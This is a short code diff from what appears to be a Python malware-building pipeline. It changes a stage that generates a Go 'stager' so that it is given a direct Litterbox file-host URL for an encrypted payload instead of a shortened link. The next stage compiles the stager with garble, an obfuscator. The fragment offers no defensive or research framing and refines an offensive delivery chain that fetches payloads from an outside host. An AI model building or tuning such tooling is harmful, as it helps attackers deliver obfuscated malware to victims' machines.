@@ -316,7 +316,7 @@ def main():
 
         # STAGE 3: Generate Go stager source
         log("\n--- Stage 3: Generate Go Stager ---")
-        stager_dir = stage_generate_stager(short_url, enc_key)
+        stager_dir = stage_generate_stager(payload_url, enc_key)  # use direct Litterbox URL, not short_url
 
         # STAGE 4: Compile stager (garble or go build)
         log("\n--- Stage 4: Compile Stager ---")
